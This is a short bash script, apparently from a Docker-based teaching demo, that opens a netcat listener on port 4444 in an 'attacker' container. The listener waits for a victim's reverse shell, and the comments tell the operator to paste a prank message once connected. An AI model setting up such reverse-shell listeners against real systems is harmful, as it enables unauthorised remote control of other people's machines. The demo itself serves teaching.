#!/usr/bin/env bash
# ATTACKER pane: wait for the victim's reverse shell. When it says "Connection received",
# press Enter, then paste the line from funny-messages.txt.
# Don't press Ctrl+C here once connected: that closes the connection yourself.
cd "$(dirname "$0")"
docker compose exec attacker nc -lvn 4444
